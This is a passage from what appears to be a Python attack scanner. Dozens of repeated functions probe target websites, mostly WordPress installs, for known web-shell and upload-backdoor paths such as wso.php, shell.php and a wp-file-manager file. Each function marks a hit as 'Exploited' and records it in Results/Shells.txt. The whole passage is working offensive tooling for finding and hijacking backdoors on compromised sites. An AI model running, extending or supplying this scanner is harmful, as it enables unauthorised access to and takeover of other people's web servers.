            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X95(url):
    try:
        upload_dir = url +"/wp-content/themes/fiestaresidences/download.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X96(url):
    try:
        upload_dir = url +"/wp-content/themes/konzept/includes/uploadify/upload.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X97(url):
    try:
        upload_dir = url +"/wp-content/plugins/wp-file-manager/lib/php/1975.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X98(url):
    try:
        upload_dir = url +"/wp-content/plugins/dos2unix/dos2unix.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X99(url):
    try:
        upload_dir = url +"/wp-content/plugins/wpyii2/wpyii2.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X100(url):
    try:
        upload_dir = url +"/assets/plugins/jQuery-File-Upload/server/php/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X101(url):
    try:
        upload_dir = url +"/wp-includes/class-wp-metadata-lazyloader-ajax.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X102(url):
    try:
        upload_dir = url +"/wp-includes/ID3/license.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X103(url):
    try:
        upload_dir = url +"/wp-content/shell.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X104(url):
    try:
        upload_dir = url +"/wp-content/bypass.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X105(url):
    try:
        upload_dir = url +"/wp-content/plugins/zero7.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X106(url):
    try:
        upload_dir = url +"/wp-content/plugins/uploads/UP1.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X107(url):
    try:
        upload_dir = url +"/wp-content/plugins/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X108(url):
    try:
        upload_dir = url +"/wp-content/wso.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X109(url):
    try:
        upload_dir = url +"/wp-content/666.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X110(url):
    try:
        upload_dir = url +"/wp-content/y7.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X111(url):
    try:
        upload_dir = url +"/wp-content/plugins/uploads/ups.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X112(url):
    try:
        upload_dir = url +"/wp-content/plugins/Shell20211018.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X113(url):
    try:
        upload_dir = url +"/upspy.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X114(url):
    try:
        upload_dir = url +"/about.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X115(url):
    try:
        upload_dir = url +"/radio.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X116(url):
    try:
        upload_dir = url +"/xxx.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X117(url):
    try:
        upload_dir = url +"/.tmb/cache/shz.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X118(url):
    try:
        upload_dir = url +"/wp-content/uploads/1234.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X119(url):
    try:
        upload_dir = url +"/fw.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X120(url):
    try:
        upload_dir = url +"/shellx.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X121(url):
    try:
        upload_dir = url +"/marijuana.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
